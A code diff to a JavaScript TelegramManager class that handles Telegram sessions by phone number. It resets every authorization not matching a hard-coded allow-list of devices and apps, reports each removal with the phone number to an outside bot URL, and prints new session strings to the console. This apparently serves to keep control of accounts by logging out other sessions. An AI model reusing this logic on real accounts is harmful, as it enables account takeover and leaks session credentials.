@@ -28,7 +28,6 @@ class TelegramManager {
     async disconnect() {
         if (this.client) {
             console.log("Destroying Client: ", this.phoneNumber);
-            await this.client.destroy();
             this.client._destroyed = true;
             await this.client.disconnect();
             this.client = null;
@@ -304,7 +303,7 @@ class TelegramManager {
         if (!this.client)
             throw new Error('Client is not initialized');
         const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
-        const updatedAuthorizations = result.authorizations.map((auth) => {
+        const updatedAuthorizations = result.authorizations.map(async (auth) => {
             if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                 auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                 auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
@@ -313,6 +312,7 @@ class TelegramManager {
                 return auth;
             }
             else {
+                await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                 this.client?.invoke(new tl_1.Api.account.ResetAuthorization({ hash: auth.hash }));
                 return null;
             }
@@ -1025,7 +1025,6 @@ class TelegramManager {
         });
         const session = newClient.session.save();
         await newClient.disconnect();
-        await newClient.destroy();
         console.log("New Session: ", session);
         return session;
     }
